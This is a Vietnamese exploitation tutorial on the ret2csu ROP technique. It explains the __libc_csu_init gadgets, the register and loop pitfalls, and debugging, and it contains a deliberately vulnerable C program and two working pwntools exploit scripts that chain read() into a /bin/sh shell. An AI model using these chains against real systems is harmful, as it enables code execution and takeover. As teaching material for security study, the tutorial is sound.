ret2csu

Khi binary thiếu gadget để đặt rdx (đối số thứ 3) — nhưng mọi ELF dùng libc đều có hàm __libc_csu_init với 2 gadget "vạn năng": một để pop 6 thanh ghi, một để mov rdx/rsi/edi rồi call. Bài này đi disasm số thật + điều kiện rbx/rbp + giới hạn edi.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Vấn đề: cần gọi hàm với 3 đối số (vd read(0, bss, 0x100) cần rdx) nhưng không có pop rdx; ret.

Giải pháp: __libc_csu_init (phần khởi tạo của mọi ELF cũ) chứa 2 gadget cố định: gadget1 = pop rbx;rbp;r12;r13;r14;r15;ret; gadget2 = mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8] (layout tùy bản). Dùng g1 nạp 6 reg, g2 chuyển vào rdx/rsi/edi & gọi.

Bẫy: điều kiện vòng lặp (rbx vs rbp), và edi chỉ 32-bit (đối số 1 bị cắt).

Nếu chỉ nhớ một điều: csu = gadget vạn năng để set rdx & gọi hàm; đặt rbx=0, rbp=1; nhớ edi chỉ 32-bit.

⚠️ Điều kiện (bẫy #1)

Cuối gadget2 có add rbx,1; cmp rbx,rbp; jne loop. Đặt rbx=0, rbp=1 → sau rbx+1==rbp → thoát loop, không gọi lại.

⚠️ edi 32-bit (bẫy #2)

gadget2 dùng mov edi, r12d (hoặc r13d) → chỉ chuyển 32 bit thấp vào rdi. Nếu đối số 1 cần 64-bit (vd con trỏ) → KHÔNG dùng csu cho rdi; set rdi bằng pop rdi riêng, csu chỉ lo rdx/rsi.

🎯 r15 = con trỏ-tới-con-trỏ

call [r15+rbx*8] gọi hàm tại *(r15) (rbx=0). Nên r15 = địa chỉ ô GOT chứa hàm (vd &_GLOBAL_OFFSET_TABLE_+..), KHÔNG phải địa chỉ hàm trực tiếp.

01 / NỀN TẢNG BẮT BUỘC

__libc_csu_init — đoạn code ai cũng có

Mọi ELF biên dịch kiểu cũ (gcc trước ~2.34 toolchain) đều có hàm __libc_csu_init chạy constructor lúc khởi động. Đoạn cuối của nó, khi disasm, tình cờ tạo thành 2 chuỗi gadget cực mạnh có mặt ở mọi binary — nên gọi là "universal gadget". Dù binary của đề không có pop rdx hay gadget phù hợp, csu luôn cứu.

Định nghĩa nhanh

ret2csu

Dùng gadget trong __libc_csu_init.

universal gadget

Gadget có ở mọi ELF cũ.

gadget1 (pop)

pop rbx,rbp,r12,r13,r14,r15; ret.

gadget2 (mov/call)

mov rdx/rsi/edi; call [r15+rbx*8].

edi limitation

Đối số 1 chỉ 32-bit qua csu.

call [reg]

Gọi hàm tại con trỏ trong bộ nhớ.

02 / VÌ SAO CÓ KỸ THUẬT

rdx là thanh ghi "khó"

Trong ROP, pop rdi/pop rsi thường dễ tìm, nhưng pop rdx; ret hiếm (gcc ít sinh). Mà nhiều syscall/hàm cần rdx: read(fd,buf,len), write(fd,buf,len), execve(path,argv,envp), mprotect(addr,len,prot). ret2csu cho bạn một cách đảm bảo set được rdx (và rsi) + gọi một hàm — không phụ thuộc gadget có sẵn. Đây là mảnh ghép giúp dựng ret2syscall/mprotect khi gadget nghèo.

04 / HAI ĐIỀU KIỆN SỐNG CÒN

rbx/rbp và edi

1

rbx=0, rbp=1 (thoát loop, gọi đúng *(r15))

call [r15 + rbx*8] với rbx=0 → gọi *(r15). Sau đó rbx+=1 → rbx=1; cmp rbx,rbp (rbp=1) → bằng → không lặp. Nếu rbp≠1 → lặp gọi lại với rbx=1 (gọi *(r15+8)) → thường crash.

2

edi chỉ 32-bit

mov edi, r12d xóa 32 bit cao của rdi. Đối số 1 nếu là số nhỏ (fd=0, prot=7) → OK. Nếu là con trỏ 64-bit (vd "/bin/sh") → KHÔNG dùng csu cho rdi; đặt rdi bằng pop rdi; ret riêng TRƯỚC khi vào csu (csu chỉ set rsi/rdx).

Chiến thuật kết hợpMẫu hay dùng: pop rdi; ret set rdi (64-bit), rồi csu set rsi+rdx (và call). Hoặc dùng csu gọi một hàm lấy đối số đầu nhỏ (read: fd=0).

07 / EXPLOIT ĐẦY ĐỦ

csu để gọi read(0,bss,path) → execve (no pop rdx)

// vuln.c — gcc vuln.c -o vuln -no-pie -fno-stack-protector  (binary KHÔNG có pop rdx)
int main(){ char b[0x40]; read(0, b, 0x200); }
# BẢN A — csu gọi read(0,bss,path_len) để nhập "/bin/sh", rồi execve.
from pwn import *
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

OFF = 72
g1  = 0x4011ca   # pop rbx,rbp,r12,r13,r14,r15; ret
g2  = 0x4011b0   # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15]
bss = exe.bss(0x300)

# csu gọi read(0, bss, 0x10) để nhập "/bin/sh\0"
chain  = b"A"*OFF
chain += p64(g1)
chain += p64(0)          # rbx=0
chain += p64(1)          # rbp=1
chain += p64(0)          # r12 → edi = 0 (fd stdin)
chain += p64(bss)        # r13 → rsi = buf
chain += p64(0x10)       # r14 → rdx = len
chain += p64(exe.got.read)  # r15 = &read@got → call read
chain += p64(g2)
chain += b"B"*56       # 7 giá trị rác (pop cuối csu: rbx..r15 = 6*8, +8 = 56)
# sau csu: dùng pop rdi set rdi=bss (64-bit!), rsi=rdx=0, rồi execve syscall / system
chain += p64(0x401263) + p64(bss)              # pop rdi; ret → rdi=bss (chuỗi đã nhập)
# ... tiếp execve bằng syscall như rop_basics ...
p.send(chain)
p.sendline(b"/bin/sh\x00")      # dữ liệu cho read
p.interactive()
Thành thậtSố g1=0x4011ca, g2=0x4011b0, phần rác 56 byte (6 pop + ret của csu sau call) là của binary mẫu — của bạn khác, disasm csu thực tế. edi 32-bit nên fd=0 OK nhưng con trỏ bss phải set bằng pop rdi riêng. gcc ≥2.34 không còn __libc_csu_init (xem §10).
# BẢN B — pwntools ROP tự dùng csu khi cần set rdx.
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False)
p = process(exe.path)
OFF = 72; bss = exe.bss(0x300)

r = ROP(exe)
r.call(exe.plt.read, [0, bss, 0x10])   # ROP TỰ dùng ret2csu để set rdx!
# ... r.call(exe.sym.system, [bss]) nếu có system plt ...
p.send(b"A"*OFF + r.chain())
log.info(r.dump())                    # xem ROP đã chèn csu gadget
p.sendline(b"/bin/sh\x00")
p.interactive()

09 / GỠ LỖI

Khi csu không gọi đúng

Loop gọi lại (crash)

rbp≠1. Đặt rbp=1, rbx=0.

Gọi địa chỉ rác

r15 là địa chỉ hàm thay vì ô GOT. Dùng &fn@got.

rdi = số nhỏ lạ

edi 32-bit cắt con trỏ. Set rdi riêng.

Reg → đối số sai

Thứ tự mov khác bản. Disasm csu thực tế.

Lệch byte rác

Sau call, csu pop 6 reg + ret → cần 56 byte bù.

gcc ≥2.34 không có csu

Dùng gadget khác / ret2dlresolve / SROP (xem §10).
